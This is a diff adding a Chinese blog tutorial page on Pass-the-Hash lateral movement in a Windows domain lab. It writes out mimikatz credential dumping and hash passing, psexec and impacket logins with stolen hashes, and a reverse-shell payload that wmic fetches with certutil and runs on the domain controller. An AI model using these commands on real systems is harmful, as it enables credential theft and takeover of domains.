@@ -1,0 +1,539 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Hash密码的存储方式在Windows操作系统中，不会存储用户输入的明文密码，而是将其输入的明文密码经过加密的方式存储在SAM数据库中，当用户使用账号密码凭据登录时，会先将用户输入的账号密码凭据转换成NTLM Hash，通过转换后的Hash与SAM数据库中的NTLM hash进行校对，校验成功则证明登录成功，反之则登录失败。 然而在Windows操作系统中加密Hash的算法也分为两种，一种是LM">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PTH-HASH传递">
+<meta property="og:url" content="https://godrone.github.io/2025/07/18/PTH-HASH%E4%BC%A0%E9%80%92/index.html">
+<meta property="og:site_name" content="Rone&#39;s Blog">
+<meta property="og:description" content="Hash密码的存储方式在Windows操作系统中，不会存储用户输入的明文密码，而是将其输入的明文密码经过加密的方式存储在SAM数据库中，当用户使用账号密码凭据登录时，会先将用户输入的账号密码凭据转换成NTLM Hash，通过转换后的Hash与SAM数据库中的NTLM hash进行校对，校验成功则证明登录成功，反之则登录失败。 然而在Windows操作系统中加密Hash的算法也分为两种，一种是LM">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://godrone.github.io/images/PTH-HASH%E4%BC%A0%E9%80%92/image-20250726000109386.png">
+<meta property="og:image" content="https://godrone.github.io/images/PTH-HASH%E4%BC%A0%E9%80%92/image-20250726000512114.png">
+<meta property="og:image" content="https://godrone.github.io/images/PTH-HASH%E4%BC%A0%E9%80%92/image-20250726001037277.png">
+<meta property="og:image" content="https://godrone.github.io/images/PTH-HASH%E4%BC%A0%E9%80%92/image-20250726001133293.png">
+<meta property="og:image" content="https://godrone.github.io/images/PTH-HASH%E4%BC%A0%E9%80%92/image-20250905172431504.png">
+<meta property="og:image" content="https://godrone.github.io/images/PTH-HASH%E4%BC%A0%E9%80%92/image-20250905172855577.png">
+<meta property="og:image" content="https://godrone.github.io/images/PTH-HASH%E4%BC%A0%E9%80%92/image-20250905180731497.png">
+<meta property="og:image" content="https://godrone.github.io/images/PTH-HASH%E4%BC%A0%E9%80%92/image-20250905181001375.png">
+<meta property="og:image" content="https://godrone.github.io/images/PTH-HASH%E4%BC%A0%E9%80%92/image-20251028072142907.png">
+<meta property="og:image" content="https://godrone.github.io/images/PTH-HASH%E4%BC%A0%E9%80%92/image-20251028055714811.png">
+<meta property="og:image" content="https://godrone.github.io/images/PTH-HASH%E4%BC%A0%E9%80%92/image-20251028070506002.png">
+<meta property="og:image" content="https://godrone.github.io/images/PTH-HASH%E4%BC%A0%E9%80%92/image-20251028070045048.png">
+<meta property="og:image" content="https://godrone.github.io/images/PTH-HASH%E4%BC%A0%E9%80%92/image-20251117230021004.png">
+<meta property="og:image" content="https://godrone.github.io/images/PTH-HASH%E4%BC%A0%E9%80%92/image-20251117230515154.png">
+<meta property="article:published_time" content="2025-07-18T14:39:06.000Z">
+<meta property="article:modified_time" content="2025-12-18T08:43:09.971Z">
+<meta property="article:author" content="Rone">
+<meta property="article:tag" content="横向渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://godrone.github.io/images/PTH-HASH%E4%BC%A0%E9%80%92/image-20250726000109386.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>PTH-HASH传递</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">主页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/friends/">友链</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于我</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/11/27/PTT%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/07/05/Token%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://godrone.github.io/2025/07/18/PTH-HASH%E4%BC%A0%E9%80%92/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://godrone.github.io/2025/07/18/PTH-HASH%E4%BC%A0%E9%80%92/&text=PTH-HASH传递"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://godrone.github.io/2025/07/18/PTH-HASH%E4%BC%A0%E9%80%92/&title=PTH-HASH传递"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://godrone.github.io/2025/07/18/PTH-HASH%E4%BC%A0%E9%80%92/&is_video=false&description=PTH-HASH传递"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=PTH-HASH传递&body=Check out this article: https://godrone.github.io/2025/07/18/PTH-HASH%E4%BC%A0%E9%80%92/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://godrone.github.io/2025/07/18/PTH-HASH%E4%BC%A0%E9%80%92/&title=PTH-HASH传递"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://godrone.github.io/2025/07/18/PTH-HASH%E4%BC%A0%E9%80%92/&title=PTH-HASH传递"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://godrone.github.io/2025/07/18/PTH-HASH%E4%BC%A0%E9%80%92/&title=PTH-HASH传递"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://godrone.github.io/2025/07/18/PTH-HASH%E4%BC%A0%E9%80%92/&title=PTH-HASH传递"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://godrone.github.io/2025/07/18/PTH-HASH%E4%BC%A0%E9%80%92/&name=PTH-HASH传递&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://godrone.github.io/2025/07/18/PTH-HASH%E4%BC%A0%E9%80%92/&t=PTH-HASH传递"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Hash%E5%AF%86%E7%A0%81%E7%9A%84%E5%AD%98%E5%82%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">1.</span> <span class="toc-text">Hash密码的存储方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="toc-number">2.</span> <span class="toc-text">哈希传递的基本概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PTH-HASH%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB"><span class="toc-number">3.</span> <span class="toc-text">PTH-HASH传递攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#mimitkaz-pth"><span class="toc-number">3.1.</span> <span class="toc-text">mimitkaz pth</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Psexec"><span class="toc-number">3.2.</span> <span class="toc-text">Psexec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WMI"><span class="toc-number">3.3.</span> <span class="toc-text">WMI</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#wmi%E4%BB%8B%E7%BB%8D"><span class="toc-number">3.3.1.</span> <span class="toc-text">wmi介绍</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#wmiexec%E5%92%8Cpsexec%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">3.3.2.</span> <span class="toc-text">wmiexec和psexec的区别</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        PTH-HASH传递
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Rone</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-07-18T14:39:06.000Z" class="dt-published" itemprop="datePublished">2025-07-18</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/" rel="tag">横向渗透</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Hash密码的存储方式"><a href="#Hash密码的存储方式" class="headerlink" title="Hash密码的存储方式"></a>Hash密码的存储方式</h2><p>在Windows操作系统中，不会存储用户输入的明文密码，而是将其输入的明文密码经过加密的方式存储在SAM数据库中，当用户使用账号密码凭据登录时，会先将用户输入的账号密码凭据转换成<strong>NTLM Hash</strong>，通过转换后的Hash与SAM数据库中的<strong>NTLM hash</strong>进行校对，校验成功则证明登录成功，反之则登录失败。</p>
+<p>然而在Windows操作系统中加密Hash的算法也分为两种，一种是LM HASH加密算法，一种是NTLM HASH加密算法，目前使用最流行的HASH加密算法为NTLMHASH（NT LAN Manager加密算法）。</p>
+<ul>
+<li><p><strong>LM Hash</strong></p>
+<p>LM Hash是早期Windows系统使用的密码存储方式，非常老旧。LM Hash作为最很早之前使用的算法，存在着很多的问题和缺陷。但随着Windows操作系统的不断更新迭代，但是为了保证系统的兼容性，Windows只是将LM Hash禁用了(从Windows Vista和Windows Server 2008版本开始，Windows操作系统默认禁用LM Hash)，LM Hash明文密码被限制在14位以内，也就是说，如果要停止使用LM Hash，将用户的密码设置为14位以上就好了。</p>
+</li>
+<li><p><strong>NTLM Hash</strong></p>
+<p>目前在大部分的Windows操作系统中所使用的密码HASH均为NTLM HASH，是经过Hex、Unicode、MD4三层编码加密等到的一个字母和数字组成的32值的Hash，如下是NTLM HASH的具体算法：</p>
+<p>1）将用户密码进行hex编码得到十六进制格式。</p>
+<p>2）将得到的十六进制结果转换为Unicode编码。</p>
+<p>3）使用MD4加密算法对Unicode转换的结果进行加密，生成32位十六进制值。</p>
+</li>
+</ul>
+<h2 id="哈希传递的基本概念"><a href="#哈希传递的基本概念" class="headerlink" title="哈希传递的基本概念"></a>哈希传递的基本概念</h2><ul>
+<li><p><strong>概念</strong></p>
+<p>哈希传递（Pass the Hash, PTH）攻击主要是针对 NTLM（NT LAN Manager）协议。NTLM 是一种身份验证协议，广泛用于 Windows 系统中，其工作方式是通过远程服务的<strong>密码哈希值（NTML-hash）<strong>进行身份验证，而不需要发送实际的密码。</strong>（这里的NTML是网络认证的一种协议，而NTLM-hash就是通过哈希函数加密过的Windows密码）</strong>。</p>
+</li>
+<li><p><strong>原理</strong></p>
+<p>攻击者通过<strong>窃取</strong>电脑密码的hash值，直接使用哈希值模拟用户身份登录目标机器。就好比小偷用你的指纹开锁。<strong>（为什么不使用明文登录，而是使用hash值登录？是因为有时候我们不一定能破解出明文密码）</strong>。</p>
+</li>
+<li><p><strong>哈希传递攻击适用环境</strong></p>
+<p><strong>在工作组环境中：</strong></p>
+<ul>
+<li>Windows Vista 之前的机器，可以使用本地管理员组内用户进行攻击。</li>
+<li>Windows Vista 之后的机器，<strong>必须是administrator用户</strong>的哈希值才能进行哈希传递攻击，其他用户(包括管理员用户但是非administrator)也不能使用哈希传递攻击，会提示拒绝访问。</li>
+</ul>
+<p><strong>在域环境中：</strong></p>
+<ul>
+<li>需要是域管理员组内用户(可以是域管理员组内非administrator用户)的哈希值才能进行哈希传递攻击，攻击成功后，可以访问域内任何一台主机**（内网中存在和当前主机相同的密码）**。</li>
+</ul>
+</li>
+</ul>
+<h2 id="PTH-HASH传递攻击"><a href="#PTH-HASH传递攻击" class="headerlink" title="PTH-HASH传递攻击"></a>PTH-HASH传递攻击</h2><h3 id="mimitkaz-pth"><a href="#mimitkaz-pth" class="headerlink" title="mimitkaz pth"></a>mimitkaz pth</h3><p><strong>实验环境</strong></p>
+<table>
+<thead>
+<tr>
+<th>主机名</th>
+<th>IP</th>
+<th>账号&#x2F;密码</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>12server2（域内主机）</td>
+<td>192.168.31.161</td>
+<td><strong>本地用户：</strong> administrator&#x2F;Aa123456!（本地管理员）<br /><strong>域用户：</strong> user1&#x2F;12345678（域普通用户）</td>
+</tr>
+<tr>
+<td>08server-dc（域控）</td>
+<td>192.168.31.160</td>
+<td><strong>本地用户：</strong> administrator&#x2F;QWEasd123（本地管理员）<br /><strong>域用户</strong>： admin&#x2F;Aa123456（域管理员），user1&#x2F;12345678（域普通用户）</td>
+</tr>
+</tbody></table>
+<p> <strong>利用过程</strong></p>
+<p>1、假设我们已经获取到了一台域成员主机的权限，并且拥有本地administrator的权限。</p>
+<p>该主机登录过域用户user1，且在user1用户上用域管理员admin权限运行过程序。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runas /profile /user:hack\admin cmd</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/PTH-HASH%E4%BC%A0%E9%80%92/image-20250726000109386.png" alt="image-20250726000109386"></p>
+<p>通过mimikatz获取到域管理员的NTLM Hash：<code>47bf8039a8506cd67c524a03ff84ba4e</code>。</p>
+<p>注：mimikatz需用管理员权限运行，具体用法请参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_59468567/article/details/137670871">mimikatz使用详情</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug		#用于提权，只能用具有管理员权限的命令行窗口才可以执行成功，普通用户使用提权命令会失败。显示privilege &#x27;20&#x27;OK表示提权成功</span><br><span class="line">sekurlsa::logonpasswords	# 抓取内存中保存的用户所有凭据</span><br><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot;&gt; password.txt		#也可使用此命令将获取到的用户凭据导出为txt文件</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/PTH-HASH%E4%BC%A0%E9%80%92/image-20250726000512114.png" alt="image-20250726000512114"></p>
+<p>2、通过获取到的hash值可直接访问域控资源。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /user:admin /domain:hack /ntlm:47bf8039a8506cd67c524a03ff84ba4e</span><br></pre></td></tr></table></figure>
+
+<p>在没有进行PTH-hash传递时，该域内主机本地管理员是无法访问域控资源的。</p>
+<p><img src="/../images/PTH-HASH%E4%BC%A0%E9%80%92/image-20250726001037277.png" alt="image-20250726001037277"></p>
+<p>通过域管理员admin的hash传递后，可直接访问到域控资源。</p>
+<p>注意这里弹出的shell还是自身，非域管理员admin。</p>
+<p><img src="/../images/PTH-HASH%E4%BC%A0%E9%80%92/image-20250726001133293.png" alt="image-20250726001133293"></p>
+<h3 id="Psexec"><a href="#Psexec" class="headerlink" title="Psexec"></a>Psexec</h3><p>Psexec的设计目的是替代telnet来帮助系统管理员进行远程管理。使用Psexec可以通过SMB协议在远程主机上运行命令，无须在远程主机上面安装任何客户端程序就可以远程管理，并且可以获得一个强交互的命令控制台。</p>
+<p><strong>#0x01 Psexec的工作原理</strong></p>
+<p>Psexec 通过SMB协议实现远程命令执行。</p>
+<p>Psexec首先通过 NTLM认证 （ Windows 经典认证协议 ）建立与远程主机的IPC连接（默认使用445端口），随后通过共享文件（如<code>admin$</code>或<code>c$</code>）将<code>psexesvc.exe</code>上传至目标主机的<code>C:\Windows</code>目录，并创建名为<code>psexesvc</code>的服务。通过<code>svcctl</code>命令启动该服务，服务内部运行<code>psexesvc.exe</code>，实现远程命令执行。</p>
+<p><strong>#0x02 Psexec使用的前提条件</strong></p>
+<ul>
+<li>需要远程系统开启 admin$ 共享（默认是开启的）</li>
+<li>因为 PsExec 连接的原理是基于 IPC 共享，因此目标需要开放445端口</li>
+<li>需要获得目标主机的明文密码或密码哈希值</li>
+</ul>
+<p><strong>#0x03 Psexec主要的两种攻击方法</strong></p>
+<p>由于psexec 是 windows 官方自带的，所以不会存在查杀问题（由于被黑客泛滥使用，因此大部分杀软已将psexec列入黑名单）。</p>
+<ol>
+<li><p>Psexec需建立ipc链接进行横向渗透</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.31.162\ipc$ &quot;Aa123456!&quot; /user:administrator</span><br><span class="line">net use	#查看是否建立IPC链接</span><br><span class="line">psexec \\192.168.31.162 -s cmd</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/PTH-HASH%E4%BC%A0%E9%80%92/image-20250905172431504.png" alt="image-20250905172431504"></p>
+</li>
+<li><p>Psexec不需要建立ipc链接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">psexec \\192.168.31.162 -u administrator -p Aa123456! -s cmd	</span><br><span class="line">#-s以System 权限运行远程进程，如果不用这个参数，就会获得一个对应用户权限的shell</span><br><span class="line">psexec \\192.168.31.162 -u administrator -p Aa123456!  -s cmd  /c &quot;ipconfig&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/PTH-HASH%E4%BC%A0%E9%80%92/image-20250905172855577.png" alt="image-20250905172855577"></p>
+</li>
+</ol>
+<p>在以下这些情况下我们无法获取明文密码</p>
+<ul>
+<li>Windows2012以上版本默认关闭wdigest，攻击者无法从内存中获取明文密码</li>
+<li>Windows2012以下版本如安装KB2871997补丁，同样也会导致无法获取明文密码</li>
+<li>Windows系统LM Hash及NTLM Hash加密算法，个人系统在windows vista后，服务器系统在windows2003以后，认证方式均为NTLM Hash</li>
+</ul>
+<p>此时进行横向渗透时使用官方自带的psexec是行不通的</p>
+<p><img src="/../images/PTH-HASH%E4%BC%A0%E9%80%92/image-20250905180731497.png" alt="image-20250905180731497"></p>
+<p>为了解决无法获取明文进行传递攻击的问题，使用非官方自带的psexec进行hash传递，虽说这个与上面的名字一样，但是这并不是微软自带的工具。</p>
+<p>使用impacket工具包，操作简单，但由于非官方自带，很有可能被杀毒软件查杀。<br>下载地址：<a target="_blank" rel="noopener" href="https://github.com/maaaaz/impacket-examples-windows">https://github.com/maaaaz/impacket-examples-windows</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec -hashes :847bfb693121775ad21ba7e42d47fd07 ./administrator@192.168.31.162</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/PTH-HASH%E4%BC%A0%E9%80%92/image-20250905181001375.png" alt="image-20250905181001375"></p>
+<p><strong>Psexec横向渗透时的一些注意事项：</strong></p>
+<ul>
+<li>在使用 PsExec 执行远程命令时，会在目标系统中创建一个psexec 的服务，命令执行完后，psexec 服务将被自动删除。由于创建或删除服务时会产生大量的日志，因此蓝队在溯源时可以通过日志反推攻击流程。</li>
+<li>使用 PsExec 可以直接获得 System 权限的交互式 Shell 的前提目标是administrator 权限的 shell</li>
+<li>在域环境测试时发现，非域用户无法利用内存中的票据使用PsExec 功能，只能依靠账号和密码进行传递。</li>
+</ul>
+<p><strong>建立IPC失败的原因</strong></p>
+<ul>
+<li>目标系统不是NT或以上的操作系统 </li>
+<li>对方没有打开IPC$共享 </li>
+<li>对方未开启139、445端口，或者被防火墙屏蔽</li>
+<li>输出命令、账号密码有错误</li>
+</ul>
+<p><strong>建立IPC常见的错误代码</strong></p>
+<ul>
+<li>5：拒绝访问，可能是使用的用户不是管理员权限，需要先提升权限</li>
+<li>51：网络问题，Windows 无法找到网络路径</li>
+<li>53：找不到网络路径，可能是IP地址错误、目标未开机、目标Lanmanserver服务未启动、有防火墙等问题</li>
+<li>67：找不到网络名，本地Lanmanworkstation服务未启动，目标删除ipc$</li>
+<li>1219：提供的凭据和已经存在的凭据集冲突，说明已经建立了IPC$，需要先删除</li>
+<li>1326：账号密码错误</li>
+<li>1792：目标NetLogon服务未启动，连接域控常常会出现此情况</li>
+<li>2242：用户密码过期，目标有账号策略，强制定期更改密码</li>
+</ul>
+<h3 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h3><h4 id="wmi介绍"><a href="#wmi介绍" class="headerlink" title="wmi介绍"></a>wmi介绍</h4><p>WMI（Windows Management Instrumentation）Windows管理规范，它提供了一种标准化的方式，管理本地或远程计算机系统。</p>
+<p>利用WMI横向渗透的优势：WMI的价值就是不需要下载和安装，因为WMI是Windows系统自带的功能，而且整个运行过程都在计算机内存中进行，操作记录不会在Winodws日志中留存。</p>
+<p>WMIC命令：WMIC（Windows Management Instrumentation Command-line）是Windows自带的一款用来管理操作WMI的工具。WMI服务默认使用RPC机制来进行通信，需要目标主机开放135端口（WMIC默认的管理端口）和445端口（wmiexec 使⽤445 端⼝传回显）。WMIC命令需要本地管理员或域管理员才可以进行正常使用。</p>
+<p>通过wmic远程连接去执行命令，命令执行结果将不会回显，而使用wmiexec可以得到一个有交互的命令执行。</p>
+<p><code>可通过建立 IPC$ ，使用 type 读取执行结果</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:192.168.31.160 /user:hack\admin /password:Aa123456 process call create &quot;cmd.exe /c ipconfig &gt; c:\ip.txt&quot;</span><br><span class="line">net use \\192.168.31.160\ipc$ &quot;Aa123456&quot; /user:admin</span><br><span class="line">type \\192.168.31.160\c$\ip.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/PTH-HASH%E4%BC%A0%E9%80%92/image-20251028072142907.png" alt="image-20251028072142907"></p>
+<h4 id="wmiexec和psexec的区别"><a href="#wmiexec和psexec的区别" class="headerlink" title="wmiexec和psexec的区别"></a>wmiexec和psexec的区别</h4><p>psexec的基本原理是：先建立IPC$通道连接，远程创建psexecsvc服务，然后通过psexec服务运行命令，服务端启动相应的程序并执行回显数据，运行结束后删除服务。</p>
+<p><strong>有psexec为啥还出现了wmiexec？</strong></p>
+<p>psexec缺点就是在启动psexec建立连接后，远程系统上会被安装一个psexecsvc服务，安装服务会留下日志。而wmi可以做到无日志，攻击脚本无需写入到磁盘，增加了隐蔽性。有大佬使用脚本调用wmi来模拟psexec的功能，于是wmiexec就诞生了。</p>
+<p><strong>0x01 wmic命令执行</strong></p>
+<p><strong>实验环境</strong></p>
+<table>
+<thead>
+<tr>
+<th>主机名</th>
+<th>IP</th>
+<th>账号&#x2F;密码</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>kali（攻击机）</td>
+<td>192.168.31.128</td>
+<td></td>
+</tr>
+<tr>
+<td>12server2（跳板机&#x2F;域内主机）</td>
+<td>192.168.31.162</td>
+<td><strong>本地用户：</strong> administrator&#x2F;Aa123456!（本地管理员）<br /><strong>域用户：</strong> user1&#x2F;12345678（域普通用户）</td>
+</tr>
+<tr>
+<td>08server-dc（域控）</td>
+<td>192.168.31.160</td>
+<td><strong>本地用户：</strong> administrator&#x2F;QWEasd123（本地管理员）<br /><strong>域用户</strong>：  admin&#x2F;Aa123456（域管理员），user1&#x2F;12345678（域普通用户）</td>
+</tr>
+</tbody></table>
+<p><strong>利用过程</strong></p>
+<p>假设已通过mimikatz抓取到了域控用户和明文密码：<code>hack\admin/Aa123456</code>。</p>
+<p>获取一个正向的msf连接，生成一个正向tcp连接的payload文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.31.128 LPORT=4444 -f exe &gt; hack.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/PTH-HASH%E4%BC%A0%E9%80%92/image-20251028055714811.png" alt="image-20251028055714811"></p>
+<p>将msf木马上传至域内主机12server2上。</p>
+<p>在msf上个运行模块来等待获取12server2反弹shell。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.31.128</span><br><span class="line">set lport 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>在12server2使用python3 -m http.server 8080命令来搭建一个简单的Web服务器。</p>
+<p><img src="/../images/PTH-HASH%E4%BC%A0%E9%80%92/image-20251028070506002.png" alt="image-20251028070506002"></p>
+<p>通过12server2的cmd使用wmic远程连接域控主机，执行下载并执行msf木马命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:192.168.31.160 /user:hack\admin /password:Aa123456 process call create &quot;cmd.exe /c certutil.exe -urlcache -f -split http://192.168.31.162:8080/hack.exe&amp;&amp;hack.exe&quot;</span><br></pre></td></tr></table></figure>
+
+<p>成功拿下域控。</p>
+<p><img src="/../images/PTH-HASH%E4%BC%A0%E9%80%92/image-20251028070045048.png" alt="image-20251028070045048"></p>
+<p><strong>0x02 wmiexec.py</strong></p>
+<p>impacket工具包的wmiexec.py脚本通过wmi实现了半交互式的shell。它是通过135端口建立DCOM连接获取win32_Process对象，通过win32_Process的create方法创建程序执行命令，然后通过445端口建立smb连接访问admin$共享下的结果文件，完成结果回显。</p>
+<p>脚本获取地址：<a target="_blank" rel="noopener" href="https://github.com/fortra/impacket/blob/master/examples/wmiexec.py">https://github.com/fortra/impacket/blob/master/examples/wmiexec.py</a></p>
+<p>上传wmiexec.py到12server2主机上，使用用户明文密码连接拿shell：</p>
